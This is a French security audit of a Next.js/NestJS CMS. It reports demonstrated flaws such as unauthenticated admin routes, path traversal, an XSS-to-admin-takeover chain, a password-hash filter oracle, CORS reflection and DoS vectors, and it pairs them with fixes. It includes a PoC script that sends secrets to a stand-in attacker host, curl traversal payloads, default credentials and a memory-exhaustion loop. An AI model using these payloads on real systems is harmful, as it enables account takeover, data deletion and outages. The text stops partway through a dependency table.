# Audit qualité / performance / sécurité — sariCMS

**Date :** 2026-09-08
**Révision auditée :** `dec7f21` (branche `arena/01a0832d-saricms`)
**Périmètre :** vitrine Next.js 16 + dashboard visiteur + back-office administrateur + API NestJS 10 (multi-driver MySQL / PostgreSQL / MongoDB / JSON)
**Objectif déclaré :** mise en production face au grand public — 2 000 à 10 000 visiteurs/jour, pics à 500 utilisateurs simultanés, hébergement Hostinger KVM4 (Node.js) avec VPS de secours.

---

## 0. Méthode — ce qui a été réellement exécuté

Cet audit ne se fonde pas sur une lecture seule. L'environnement a été **construit, démarré et attaqué** :

| Étape | Commande | Résultat |
|---|---|---|
| Installation backend | `cd backend && npm install` | 761 paquets, `prisma generate` **échoue** (binaires injoignables) |
| Installation frontend | `npm install` | 531 paquets |
| Compilation TypeScript | `npx tsc --noEmit` | **0 erreur** |
| Build de production | `npm run build` | **ÉCHEC, code 1** |
| Build après `npm run intl:sync` | `npm run intl:sync && npm run build` | succès |
| Lint | `npx eslint . --ext .ts,.tsx` | **542 problèmes (269 erreurs, 273 avertissements)** sur 155 fichiers |
| Tests unitaires backend | `npx jest` | **134/134 passent** (18 suites) |
| Couverture backend | `npx jest --coverage` | **23,3 % instructions / 30,2 % branches / 20,2 % fonctions** |
| Tests e2e backend | `npm run test:e2e` | **script mort** : `backend/test/` n'existe pas |
| CVE dépendances | `npm audit` (front + back) | front : **38 vulnérabilités dont 2 critiques, 9 hautes** · back (prod) : **18 dont 8 hautes** |
| Amorçage + démarrage API | `npm run seed && npm run start:dev` | API live sur `:3101`, driver JSON |
| Démarrage vitrine | `next start -p 5000` et `next dev -p 5050` | les deux serveurs live |
| Probes HTTP | ~200 requêtes `curl` ciblées | résultats reproduits dans ce document |

**Convention de lecture :** chaque finding est marqué
`[DÉMONTRÉ]` (reproduit par une requête ou un test exécuté) ou
`[LECTURE]` (établi par lecture de code, non exécuté — le test exact à jouer est alors donné).

---

## 1. Verdict global

> ### Le code n'est **pas** mettable en production en l'état.
>
> Trois bloqueurs indépendants suffisent, chacun, à disqualifier la mise en ligne :
> 1. **`npm run build` échoue** sur un clone propre — le déploiement ne peut pas aboutir.
> 2. **Quatorze routes `/api/admin/*` du front sont sans aucune authentification**, dont une qui écrit et supprime des fichiers n'importe où dans le projet.
> 3. **Le tunnel de commande et de paiement n'existe pas côté serveur** : commandes, coupons, taxes et paiements vivent dans le `localStorage` du navigateur du visiteur.
>
> La qualité *intrinsèque* du code est pourtant réelle et nettement au-dessus de la moyenne : typage propre, DTO validés, commentaires qui expliquent le *pourquoi*, 134 tests verts. Le problème n'est pas l'artisanat, c'est **l'absence de couche de décision serveur** sur tout ce qui touche à l'argent, aux fichiers et à l'identité.

### Scores de confiance

| Axe | Score | Justification courte |
|---|---:|---|
| Qualité d'écriture du code | **62 %** | `tsc` clean, DTO `class-validator` systématiques, garde-fous de chemin bien pensés côté GED, commentaires de décision. Pénalisé par 269 erreurs ESLint dont 7 `rules-of-hooks` réelles. |
| Robustesse fonctionnelle (cas limites) | **41 %** | Unicode/arabe gérés, mais slug vide non gardé, `module` non défini renvoyé en `[object Object]`, dates MySQL `0000-00-00` traitées en aval plutôt qu'en amont. |
| Sécurité | **18 %** | 4 failles critiques démontrées, dont une chaîne non-authentifiée → reprise de compte admin. Aucun CSP. CORS crédentiel sur suffixes publics. |
| Fiabilité front ↔ back ↔ base | **22 %** | Deux sources de vérité pour le commerce (localStorage vs API), aucune migration Prisma initiale, DDL réel dans `backend/sql/`. |
| Performance / tenue en charge | **30 %** | `cache: 'no-store'` partout, throttle global de 120 req/min **partagé par tous les visiteurs** faute de `trust proxy`, écriture O(n) à chaque sauvegarde CRM. |
| Couverture de test | **23 %** | 23,3 % d'instructions, 0 test e2e, 0 test sur `auth.service`, `permissions.guard`, `json-repository`, aucun test d'API publique. |
| Prêtness déploiement | **12 %** | Build cassé, secrets par défaut documentés dans le README, Swagger public, aucun `trust proxy`. |

### **Score de confiance global : 28 / 100**

**Pourquoi ce chiffre, et pas un autre.** La pondération n'est pas uniforme : pour une mise en production grand public, la sécurité et la chaîne de déploiement sont éliminatoires, pas additives.

- Ce qui **remonte** le score (≈ +28 points au-dessus d'un projet jetable) : le backend Nest est architecturalement sain — garde JWT globale par `APP_GUARD`, `@Public()` explicite et jamais implicite (vérifié : `GET /users` → 401, `GET /audit-logs` → 401), `whitelist: true` + `forbidNonWhitelisted: true` sur le `ValidationPipe` global, `sortBy` sur liste blanche (vérifié : `sortBy=passwordHash` → 400 « Cannot sort by passwordHash »), `limit` plafonné à 100, rotation du refresh token avec hachage SHA-256 au repos, 2FA TOTP avec challenge à durée de vie courte, révocation des sessions au changement de mot de passe, hachage bcrypt à 12 rounds, jeton de confirmation avant purge définitive, soft-delete + corbeille, journal d'audit. C'est un vrai travail d'ingénieur, et les 134 tests passent.
- Ce qui **plombe** le score (−72) : les quatre failles critiques ci-dessous sont toutes sur le **chemin public**, sans identifiant, et deux d'entre elles mènent à une reprise de contrôle totale. Un projet peut survivre à de la dette technique ; il ne survit pas à une écriture de fichier non authentifiée servie en `text/html` sur la même origine que les jetons d'administration.

Le score de **robustesse du code seul** (hors enjeu de déploiement) serait de **46 %**. Le score de **confiance pour une mise en production face au grand public** est de **28 %**. C'est ce second chiffre qui doit piloter la décision.

---

## 2. Bloqueurs de mise en production (P0)

### 2.1 `[DÉMONTRÉ]` `npm run build` échoue sur un clone propre

```
$ npm run build
> npm run intl:check && npm run builder:check && next build
> intl:check
⚠️  Atelier en retard sur les messages
  fr — translate/fr.json obsolète
  en — translate/en.json obsolète
  ar — translate/ar.json obsolète
BUILD EXIT CODE = 1
```

**Cause racine :** `.gitignore` exclut `/translate/fr.json`, `/translate/en.json`, `/translate/ar.json`. Un clone frais — donc un serveur de déploiement, donc Hostinger — ne les a pas. `scripts/check-translations.mjs` les exige synchronisés avec `messages/*.json` et sort en non-zéro. Le `&&` arrête la chaîne : **`next build` n'est jamais atteint**.

```
$ npm run intl:sync && npm run build
BUILD EXIT CODE = 0
```

**Correction :** `intl:sync` doit précéder `intl:check` dans le script `build`, ou `intl:check` doit traiter « fichier absent » comme « à générer » et non comme « obsolète ». Un script de build qui exige un état que le dépôt ne fournit pas n'est pas un contrôle qualité, c'est une panne.

### 2.2 `[DÉMONTRÉ]` 14 routes `/api/admin/*` sans aucune authentification

`middleware.ts` exclut explicitement `/api` de tout traitement, et le `matcher` l'exclut aussi :

```ts
if (pathname.startsWith('/api') || …) return NextResponse.next();
matcher: ['/((?!api|_next|_vercel|.*\\..*).*)', …]
```

Aucune de ces routes ne vérifie de jeton. **Toutes répondent 200 à un appel anonyme** :

| Route | Méthodes | Ce qu'elle fait sans identifiant |
|---|---|---|
| `/api/admin/upload` | GET POST PATCH DELETE | liste la médiathèque, **écrit**, **renomme**, **supprime** des fichiers |
| `/api/admin/ged/asset` | GET PATCH PUT DELETE | écrit les fiches, renomme, supprime |
| `/api/admin/ged/assets` · `/asset/state` · `/canvas-export` · `/templates` | GET POST PUT DELETE | écrit rendus et gabarits sur disque |
| `/api/admin/verification` | GET PUT | **renvoie la clé d'API tierce en clair**, la réécrit |
| `/api/admin/translations/file` | GET PUT | **réécrit `messages/<locale>.json`**, donc tout le texte du site |
| `/api/admin/translations` · `/tree` | GET PUT | idem |
| `/api/admin/seo` | GET PUT | réécrit `data/seo.json` |
| `/api/admin/home` · `/home/options` · `/newsletter` · `/taxonomies/translations` | GET POST PATCH DELETE | réécrit la page d'accueil, la liste d'abonnés |
| `/api/admin/verification/test` | POST | déclenche un appel sortant |

Preuve :

```
$ curl -s http://127.0.0.1:5000/api/admin/verification
{"api":{"enabled":false,"url":"","apiKey":"","authHeader":"X-API-Key", …
$ curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:5000/api/admin/upload
200
$ curl -s -o /dev/null -w "%{http_code}\n" "…/api/admin/translations/file?locale=fr&path=admin/common.json"
200
```

Le commentaire de la route `verification` affirme : *« l'écran est derrière l'accès administrateur »*. **C'est faux.** L'écran l'est (côté client) ; la route, non. Toute la sécurité de ces endpoints repose sur une hypothèse qui n'est écrite nulle part dans le code et vérifiée nulle part à l'exécution.

### 2.3 `[DÉMONTRÉ]` Chaîne complète : anonyme → reprise du compte administrateur

Quatre maillons, chacun vérifié séparément, qui s'enchaînent :

**Maillon 1 — écriture d'un fichier `.html` sans authentification.** `POST /api/admin/upload` (branche `multipart`) ne filtre **ni l'extension ni le contenu** :

```ts
// app/api/admin/upload/route.ts
function generateFileName(module, id, slug, originalName) {
  const ext = path.extname(originalName).toLowerCase() || '.jpg';   // ← aucune liste blanche
  …
}
```

À comparer avec la GED, qui elle filtre correctement : `WRITABLE_EXTENSIONS = ['png','jpg','jpeg','webp','avif','gif','svg','pdf']` et *« `html` en est absent volontairement »*. La route historique n'hérite pas de cette protection.

```
$ curl -X POST http://127.0.0.1:5000/api/admin/upload \
    -F "file=@payload.html;type=text/html" -F "module=ged" -F "id=2" -F "slug=poc"
{"url":"/uploads/ged/ged_2_poc.html", …}   → HTTP 200
$ ls public/uploads/ged/ged_2_poc.html      → écrit
```

**Maillon 2 — le fichier est servi en `text/html` sur l'origine du site.**

```
$ curl -D - http://127.0.0.1:5050/uploads/ged/ged_2_poc.html
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
```

**Maillon 3 — aucun `Content-Security-Policy`.** `main.ts` désactive explicitement le CSP de helmet (`contentSecurityPolicy: false`) et le front n'en pose aucun :

```
$ curl -D - http://127.0.0.1:5050/uploads/ged/ged_2_poc.html | grep -i content-security
(aucune réponse)
```

**Maillon 4 — les jetons d'administration sont dans `localStorage`.** `lib/admin-session.ts` :

```ts
export const ADMIN_ACCESS_KEY  = 'sari_admin_access';
export const ADMIN_REFRESH_KEY = 'sari_admin_refresh';
localStorage.setItem(ADMIN_ACCESS_KEY, session.accessToken);
```

**Résultat.** Un visiteur anonyme dépose une page, envoie son URL à un administrateur (ou la fait indexer), et le script s'exécute **sur l'origine du site** : il lit `sari_admin_access` **et** `sari_admin_refresh`, les exfiltre, et l'attaquant dispose d'un compte super-admin. Le refresh token à 7 jours rend la compromission durable même après expiration de l'access token à 15 minutes.

PoC exécuté — le script placé dans le fichier téléversé appelait précisément la route qui fuit les secrets :

```html
<script>fetch("/api/admin/verification").then(r=>r.json())
  .then(d=>navigator.sendBeacon("//attacker.tld",JSON.stringify(d)))</script>
```

**Sévérité : critique.** CVSS 3.1 ≈ 9,8 (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` — aucun privilège requis, aucune interaction pour le dépôt).

### 2.4 `[DÉMONTRÉ]` Traversée de chemin : écriture et suppression arbitraires

Toujours sur `/api/admin/upload`, trois paramètres non assainis :

```ts
const folder = (formData.get('module') as string) || 'ged';   // non filtré
const id     = formData.get('id') as string || …;             // non filtré
function getModuleDir(module) { return path.join(UPLOAD_DIR, module); }   // path.join résout « .. »
…
const filePath = path.join(UPLOAD_DIR, file);   // DELETE : `file` vient de la query string
await unlink(filePath);
```

**Écriture hors de `public/uploads` — exécuté :**

```
$ curl -X POST http://127.0.0.1:5000/api/admin/upload \
    -F "file=@payload.html" -F "module=ged" -F "id=../../../../../data/pwn" -F "slug=x"
→ HTTP 200
$ ls -la data/pwn_x.html
-rw-r--r-- 1 user user 164 … data/pwn_x.html      ← écrit dans data/, hors médiathèque
```

**Suppression arbitraire — exécuté :**

```
$ echo '{"canary":"ne pas toucher"}' > data/__audit_canary.json
$ curl -X DELETE "http://127.0.0.1:5000/api/admin/upload?file=../../data/__audit_canary.json"
{"success":true,"file":"../../data/__audit_canary.json"}   → HTTP 200
$ ls data/__audit_canary.json
ls: cannot access …: No such file or directory             ← supprimé
```

**Portée réelle.** L'arithmétique de chemin vérifie que ces cibles sont atteignables depuis la route :

| Requête | Fichier touché |
|---|---|
| `DELETE ?file=../../data/seo.json` | `sariCMS/data/seo.json` |
| `DELETE ?file=../../data/verification.json` | `sariCMS/data/verification.json` |
| `DELETE ?file=../../messages/fr.json` | `sariCMS/messages/fr.json` — casse toutes les libellés FR |
| `DELETE ?file=../../package.json` | `sariCMS/package.json` — casse le redéploiement |
| `POST id=../../../../../data/pwn` | `sariCMS/data/pwn_x.html` — **prouvé** |

`PATCH` fait un `rename` avec la même arithmétique : déplacement arbitraire.

Note d'honnêteté : la GED (`lib/ged/store.mjs`, `backend/src/modules/ged/ged.service.ts`) est **correctement protégée** — `inside()` refuse `..`, les chemins absolus et l'octet nul, et un test d'évasion existe (`ged.service.spec.ts` passe). Le trou est dans la **route historique**, que la GED n'a pas remplacée. Deux implémentations du même service, une seule sécurisée : c'est un cas d'école de duplication dangereuse.

### 2.5 `[DÉMONTRÉ]` Le commerce n'existe pas côté serveur

Le besoin déclare « paiement » et « création de compte » comme fonctionnalités sensibles. Voici ce que fait réellement le code.

**La commande ne quitte jamais le navigateur.** `app/[locale]/cart/page.tsx` :

```ts
const createOrderAndRedirect = (…) => { …; return addOrder(orderData); };
```

`addOrder` vient de `contexts/OrdersContext.tsx`, dont la seule persistance est :

```ts
useEffect(() => { localStorage.setItem('sari_orders', JSON.stringify(orders)); }, [orders]);
```

**Aucun appel réseau.** `grep` sur tout le front ne trouve aucune occurrence de `cmsFetch('/orders')` ni de `pushCollection('orders', …)` depuis le tunnel d'achat. L'API expose bien `POST /orders` (`backend/src/modules/orders/orders.controller.ts`) — **la vitrine ne l'appelle jamais**.

Conséquences : le commerçant ne reçoit rien ; vider le cache du navigateur efface la commande ; changer d'appareil la fait disparaître ; l'identifiant de commande est `Date.now()`, donc non unique à la milliseconde près et devinable.

**Le paiement est une variable locale.** `lib/payments.ts` :

```ts
export function isAutoValidated(method) {
  return method === 'card-intl' || method === 'cib' || method === 'paypal';
}
…
status: auto ? 'validated' : 'pending',          // ← décidé dans le navigateur
```

puis, dans la page de paiement : `updateOrderStatus(order.id, auto ? 'paid' : 'pending_payment')`.

Il n'y a **aucune passerelle de paiement** : pas de PSP, pas de webhook, pas de signature, pas de vérification d'encaissement. Choisir « Carte internationale » dans une liste déroulante marque la commande payée.

**Les données de l'écran administrateur sont fabriquées.** `loadPaymentRecords()` retourne `DEMO_RECORDS` quand le `localStorage` est vide et **les y écrit** : cinq paiements fictifs, noms et adresses inventés (`marie@clinique.fr`, `achats@chu-lyon.fr`, montants 4 500 / 18 500 / 28 800 / 42 000 DA). L'écran `/admin/payment-records` lit `loadPaymentRecords()` — donc **le navigateur de l'administrateur**. Le marchand voit une comptabilité inventée, exportable en CSV.

**Coupons, taxes et moyens de paiement sont dans le navigateur du visiteur.** `lib/shop-store.ts` :

```ts
const PAY_KEY='sari_payments', COUPON_KEY='sari_coupons', TAX_KEY='sari_taxes', USE_KEY='sari_coupon_uses';
export function loadCoupons() { return read(COUPON_KEY, DEFAULT_COUPONS)… }
```

Un visiteur ouvre la console, écrit `localStorage.sari_coupons = '[{"code":"X","type":"percent","amount":100}]'`, l'applique, et `computeTotals` calcule un total à zéro. Le compteur d'usage par coupon (`sari_coupon_uses`) est également local : la limite d'usage n'existe pas.

**Les prix ne sont jamais revérifiés.** `CommerceItemDto` accepte `price` du client :

```ts
@ApiProperty() @IsNumber() @Min(0) price!: number;
```

et `OrdersService` / `QuotesService` n'ont **aucune logique de recalcul** — leurs seules occurrences de `total` sont dans `listFields` / `sortableFields`. Même si la commande atteignait l'API, un `price: 0.01` serait enregistré tel quel. Il n'y a aucune jointure avec le catalogue produits.

> **Verdict sur ce point : le module e-commerce est une maquette d'interface.** Il est interdit de le mettre face au public. Soit on le débranche (boutons de commande retirés, vitrine catalogue seule), soit on l'adosse à un vrai PSP avec recalcul serveur des prix — et ce n'est pas une correction, c'est un chantier.

### 2.6 `[DÉMONTRÉ]` L'inscription publique ne crée aucun compte

`contexts/AuthContext.tsx` :

```ts
try { await cmsFetch('/users', { method:'POST', json:{…} }); }
catch { /* API hors-ligne ou validations Nest → on continue en local. */ }
const registry = readRegistry();  registry.push({ …newUser, password: userData.password });
writeRegistry(registry);  persist(newUser);  return true;
```

Or `POST /users` exige une permission :

```ts
@Post() @RequirePermissions(perm('users', 'create'))
```

L'appel anonyme reçoit donc **403 systématiquement**. L'erreur est avalée, le compte est créé **dans `localStorage` avec le mot de passe en clair**, et `register()` retourne `true`. L'utilisateur est connecté, voit son dashboard, et **son compte n'existe pas**. Il le perdra au premier changement de navigateur.

Ajoutons le repli de connexion : si l'API est injoignable (ou dépasse les **8 s** de `timeoutMs`), `login()` retombe sur des comptes de démonstration en dur —

```ts
'client@sari.dz': { …, password: 'demo123' },
'partner@sari.dz': { …, password: 'demo123' },
```

— donc **une panne de l'API ouvre trois sessions** avec des identifiants publiés dans le dépôt. Un attaquant qui provoque un dépassement de délai (voir 3.4) obtient une session `partner` gratuite.

### 2.7 `[DÉMONTRÉ]` Identifiants d'administration par défaut, publiés, fonctionnels

`README.md` : *« Admin login uses the seed account `admin@sarisysteme.com` / `ChangeMe_Sari2026!` »*. `backend/.env.example` porte les mêmes valeurs. Testé contre l'API amorcée :

```
$ curl -X POST http://127.0.0.1:3101/api/v1/auth/login \
    -d '{"email":"admin@sarisysteme.com","password":"ChangeMe_Sari2026!"}'
{"success":true,"data":{"accessToken":"eyJhbGciOiJIUzI1NiIs…",
 "user":{"email":"admin@sarisysteme.com","type":"admin","role":"super-admin"…}}}
```

Rôle `super-admin` → `permissions: ['*']` → bypass total de `PermissionsGuard`. Aucun forçage de changement au premier lancement, aucune détection de mot de passe par défaut.

Dans le même registre, `scripts/seed-test-users.mjs` porte huit mots de passe en clair (`AdminSari_2026!`, `Editeur_Sari26!`, `ClientSari_26!`…) et `docs/COMPTES-DE-TEST.md` les documente.

### 2.8 `[DÉMONTRÉ]` Swagger public et secret JWT de repli

```
$ curl -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3101/api/v1/docs
200
```

`main.ts` monte Swagger **sans condition de `NODE_ENV`** : le plan complet de l'API, DTO compris, est offert à l'attaquant.

`jwt.strategy.ts` accepte un secret de repli codé en dur :

```ts
secretOrKey: config.get<string>('JWT_ACCESS_SECRET') || 'dev-access-secret',
```

Si la variable manque au déploiement, **tout jeton forgé avec la chaîne publique `'dev-access-secret'` est accepté**. L'application doit refuser de démarrer sans secret, pas en improviser un.

---

## 3. Failles de sécurité complémentaires

### 3.1 `[DÉMONTRÉ]` Oracle booléen sur les colonnes sensibles — extraction des empreintes de mot de passe

`PrismaRepository.buildWhere()` place le nom de champ **tel quel** dans la clause `where`, sans liste blanche :

```ts
case 'startsWith':
  and.push({ [clause.field]: { startsWith: String(clause.value) } });
```

`BaseCrudService.sanitize()` retire `passwordHash`, `totpSecret` et `partnerKey` de la **réponse** — mais pas du **filtre**. Le nombre total de lignes devient donc un canal de fuite d'un bit par requête.

Exécuté avec un jeton administrateur, sur `GET /users` :

```
-- réponse normale : le hash est bien masqué --
{"data":[{"id":"6d38cd29…","email":"admin@sarisysteme.com","firstName":"Admin",…}]}

-- filtre startsWith sur passwordHash --
   préfixe 'ZZZZ' -> total = 0
   préfixe '$2a$' -> total = 1     ← fuite
   préfixe '$2b$' -> total = 0
   préfixe '$2y$' -> total = 0
```

L'oracle fonctionne. Une empreinte bcrypt fait 60 caractères sur un alphabet de 64 symboles : **≈ 3 840 requêtes** pour la reconstituer intégralement, puis cassage hors ligne. Le même oracle expose `totpSecret` (désactivation de la 2FA) et `partnerKey`.

Deux aggravations :

- **Le prérequis de privilège est faible.** Il suffit de `users:read` — la permission d'un rôle « lecteur » ou « éditeur » qui ne devrait voir que des noms et des adresses. C'est une élévation de *lecteur* à *prise de contrôle du compte super-admin*.
- **Le même mécanisme est accessible sans authentification** sur les 13 contrôleurs `@Public()` : `publishedQuery` impose `status: 'published'` mais propage `query.filter` non filtré. Sur un endpoint public, un `filter[<colonne>][contains]=…` permet de sonder le schéma (200 vs 500 selon que la colonne existe) puis d'extraire par oracle toute donnée d'une ligne publiée, y compris des champs non projetés.

**Correction :** liste blanche des champs filtrables par ressource (elle existe déjà pour `sortBy` via `assertSortable` — il faut la généraliser), et refus de tout filtre sur une colonne exclue de `sanitize()`.

### 3.2 `[DÉMONTRÉ]` CORS crédentiel sur des suffixes de domaine publics

`main.ts` :

```ts
if (/\.e2b\.app$/.test(origin) || /\.vercel\.app$/.test(origin)) return cb(null, true);
if ((config.get('NODE_ENV') || 'development') !== 'production') return cb(null, true);
```

Ces deux tests **précèdent** le contrôle de `NODE_ENV` : ils s'appliquent donc aussi en production. Or `*.vercel.app` et `*.e2b.app` sont des suffixes que **n'importe qui** peut obtenir gratuitement en quelques minutes.

```
$ curl -i -X OPTIONS …/auth/login -H 'Origin: https://attaque-par-un-inconnu.vercel.app' …
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://attaque-par-un-inconnu.vercel.app
Access-Control-Allow-Credentials: true
```

Même résultat avec `https://3000-xyz123.e2b.app`. En développement (état actuel du `.env.example`, `NODE_ENV=development`), **toute origine est réfléchie** :

```
$ curl -i -X OPTIONS …/auth/login -H 'Origin: https://evil.com' …
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

Conséquence : la liste blanche `CORS_ORIGINS` est contournable de façon permanente. Combinée à un XSS (§2.3), elle permet la lecture inter-origines de toutes les réponses de l'API.

Fuite secondaire, même cause : `helmet()` est enregistré **après** `enableCors()`, donc la réponse de prévol ne passe pas par helmet —

```
X-Powered-By: Express
```

— ce qui divulgue la pile serveur sur chaque prévol.

### 3.3 `[LECTURE]` Aucune politique de sécurité de contenu

`helmet({ contentSecurityPolicy: false })` côté API, aucun en-tête CSP côté Next. En-têtes effectivement observés : `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security`, `Referrer-Policy: no-referrer` — c'est correct, mais **insuffisant** : il n'y a rien entre une injection HTML et l'exécution de script.

Le risque est structurel, pas théorique : le CMS rend du HTML produit par des rédacteurs (TipTap, `AdminHtmlEditor`, constructeur de pages GrapesJS). Toute faille de désinfection de ce HTML devient immédiatement exécutable, sans filet. Et les jetons sont en `localStorage`, donc accessibles à n'importe quel script — un CSP `script-src 'self'` aurait au moins bloqué la chaîne du §2.3.

**À faire avant la mise en ligne :** `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'self'`, en mode `Content-Security-Policy-Report-Only` d'abord pour mesurer la casse.

### 3.4 `[DÉMONTRÉ]` Le limiteur de débit est global, pas par visiteur — et contournable

**Mesure du plafond réel :**

```
=== 130 requêtes publiques successives sur /public/news ===
réponses normales: 119   429 (throttlées): 11

=== 14 tentatives de connexion (plafond annoncé 10/min) ===
401 401 401 401 401 401 401 401 401 429 429 429 429 429
```

Le throttling fonctionne. **Le problème est ce qu'il compte.** `@nestjs/throttler` suit `req.ip`. Express ne fait confiance à `X-Forwarded-For` que si `trust proxy` est activé — or :

```
$ grep -rn "trust proxy\|trustProxy\|getTracker" backend/src app lib
(2 résultats, aucun dans backend/src : seulement deux lectures manuelles de
 x-forwarded-for dans app/api/verification/check et lib/server/cms-or.ts)
```

`main.ts` ne fait jamais `app.set('trust proxy', …)`. Derrière le proxy inverse de Hostinger (LiteSpeed/nginx), **`req.ip` vaut l'adresse du proxy pour 100 % du trafic**. Les 120 requêtes/minute sont donc un budget **partagé par l'ensemble des visiteurs du site**.

**Projection sur la charge annoncée.** Une page d'accueil appelle au minimum : menus, blocs d'accueil, actualités, produits, services, coordonnées, visibilité, abonnements — soit 6 à 10 requêtes API. À 500 visiteurs simultanés, le premier tour de page émet ≈ 4 000 requêtes dans la même minute, contre un plafond de 120. **Le site entier passe en 429 en quelques secondes de pic**, et le reste en repli sur les JSON statiques — donc un contenu figé, sans le moindre signal d'erreur côté visiteur.

Aggravations en cascade :

- `cmsFetch` pose `cache: 'no-store'` sur **toutes** les requêtes et son délai par défaut est **2 500 ms**. Rien n'est mis en cache côté navigateur, tout retombe sur l'API, et un ralentissement de l'API se transforme en avalanche d'abandons.
- `app/api/verification/check/route.ts` se protège avec `clientIp(req)` qui lit `x-forwarded-for` **fourni par le client** : `const fwd = req.headers.get('x-forwarded-for'); return (fwd ? fwd.split(',')[0].trim() : '') || …`. En faisant varier cet en-tête, on réinitialise le compteur à volonté et on contourne la limite de 12 vérifications / 5 min — protection dont dépend directement l'appel à une **API externe payante**.
- Le suivi est en mémoire processus (`globalThis.__sariNewsletterRate`, `Map` du `GeoService`) : dès qu'on passe à deux instances (PM2 cluster, VPS + KVM4), chaque instance a ses compteurs et le plafond réel double.

**À faire :** `app.set('trust proxy', 1)` (ou le nombre exact de sauts) + `getTracker` explicite ; remonter `THROTTLE_LIMIT` ou, mieux, sortir les endpoints publics du throttle global pour leur donner des plafonds dédiés ; supprimer `cache: 'no-store'` des lectures publiques et mettre un `Cache-Control: s-maxage` + `stale-while-revalidate`.

### 3.5 `[DÉMONTRÉ]` La newsletter fuit le jeton de désabonnement et permet l'effacement de masse

```
$ curl -X POST …/public/newsletter -d '{"email":"victime@example.com","name":"Test"}'
{"data":{"created":true,…,"subscriber":{"email":"victime@example.com",…,"ip":"127.0.0.1",
 "userAgent":"curl/7.88.1",…,"token":"25ec1e64-acf7-4ff3-8f8c-66f8f6b1f815",…}}}
```

Quatre problèmes dans une seule réponse :

1. **Le `token` de désabonnement est rendu à l'appelant anonyme.** `toView(…, 'block')` renvoie la fiche entière et `sanitize()` ne retire que `passwordHash`/`totpSecret`/`partnerKey`. `cardFields` du module newsletter liste d'ailleurs explicitement `'ip'`, `'userAgent'`, `'token'`.
2. **Les données personnelles collectées (`ip`, `userAgent`) repartent vers n'importe qui** connaît l'adresse. Exposition RGPD directe : ces champs sont précisément ceux qui servent de preuve de consentement.
3. **Oracle d'énumération d'adresses.** `{"created":false,"duplicate":true}` contre `{"created":true}` révèle si une adresse est abonnée. Vérifié : la seconde requête sur la même adresse renvoie `duplicate: true`.
4. **Désinscription sans preuve de possession.** `POST /public/newsletter/unsubscribe` accepte `{"email": …}` seul :

```
$ curl -X POST …/public/newsletter/unsubscribe -d '{"email":"victime@example.com","reason":"other"}'
{"data":{"done":true,"subscriber":{…"status":"unsubscribed"…}}}
```

`unsubscribe()` cherche d'abord par jeton, **puis retombe sur l'adresse** : `if (!row && email) row = await this.repository.findOne({ email })`. Une boucle sur une liste d'adresses vide la liste de diffusion entière. Au plafond constaté de ~120 req/min, 10 000 abonnés disparaissent en ≈ 85 minutes. Aucun captcha n'est exigé sur ce endpoint (contrairement au formulaire vitrine, qui lui en a un).

`ip` et `userAgent` sont de plus **fournis par le client** dans le DTO (`dto.ip || req.ip`) : la « preuve de collecte » inscrite en base est falsifiable à volonté.

### 3.6 `[LECTURE]` Refus de service par épuisement mémoire sur `/geo/ip`

```ts
@Public() @Controller('geo')
  @Get('ip') lookup(@Query('ip') ip?: string) { return this.geo.lookup(ip || ''); }
```

`GeoService` met en cache dans `private readonly cache = new Map<string, GeoLookup>()` — **sans taille maximale, sans expiration, sans éviction**, contrairement au limiteur de la newsletter qui, lui, se plafonne à 2 000 entrées. Chaque valeur distincte de `ip` ajoute une entrée (y compris en cas d'échec : le `fallback` est mis en cache aussi). Une boucle `for i in $(seq …); do curl "…/geo/ip?ip=1.2.3.$i"; done` fait croître le tas jusqu'à l'OOM, **sans authentification** et sous le seul plafond du throttle global.

Chaque requête déclenche en outre **deux appels sortants** (`ipwho.is` puis `ipapi.co`) depuis l'IP du serveur : quota gratuit consommé, et le serveur devient un relais de requêtes. `encodeURIComponent` empêche bien le détournement d'hôte — ce n'est pas une SSRF — mais l'amplification et la fuite mémoire sont réelles. Sur un KVM4 partagé avec MySQL et Next, l'OOM tue le processus.

**Test à exécuter en préproduction** (à ne PAS jouer sur le serveur de production) :

```bash
for i in $(seq 1 200000); do curl -s -o /dev/null "$API/api/v1/geo/ip?ip=10.0.$((i/250)).$((i%250))"; done
# puis observer : pm2 monit  /  process.memoryUsage().heapUsed  /  RSS du processus
```

### 3.7 `[LECTURE]` Dépendances : CVE ouvertes, dont une haute sur l'éditeur riche

`npm audit` — **frontend, dépendances de production seules** : `{"info":0,"low":0,"moderate":27,"high":9,"critical":2,"total":38}`.

Les plus préoccupantes :

| Paquet | Sévérité | Avis | Portée |
|---|---|---|---|
| `@tiptap/core` ≤ 3.30.4 | **haute** | GHSA-cp6q-959q-f8rh — `mergeAttributes()` transforme une clé propre `__proto__` en attributs DOM hérités exécutables ; GHSA-j95f-988m-3j2f — ReDoS quadratique | **Éditeur riche du back-office.** Le dépôt déclare `^3.30.2` : la version résolue est vulnérable. `npm audit fix` (sans `--force`) suffit. |
| `next` 16.2.12 (via `postcss`, `sharp`) | **haute** | GHSA-qx2v-qp2m-jg93, GHSA-6g55-p6wh-862q (PostCSS) ; GHSA-f88m-g3jw-g9cj, GHSA-rgj7-g3m4-5g8c (sharp/libvips/libheif) | Correctif dans `next@16.3.4` — **une version de correctif plus loin**, hors de la plage `16.2.12` épinglée. |
| `tar` ≤ 7.5.20 (via `canvas` ← `fabric`) | **critique** | 12 avis dont GHSA-34x7-hfp2-rc4v (création/écrasement arbitraire par traversée de lien physique) | Chaîne d'installation native. Correctif : `fabric@7.4.0`, changement majeur. |
| `underscore` ≤ 1.13.7 (via `grapesjs`) | haute | GHSA-qpx9-hpmf-5gmw — récursion illimitée, DoS | Constructeur de pages. `npm audit fix` suffit. |

**Backend, dépendances de production** : `18 vulnerabilities (1 low, 9 moderate, 8 high)`.

| Paquet | Sévérité | Avis |
|---|---|---|
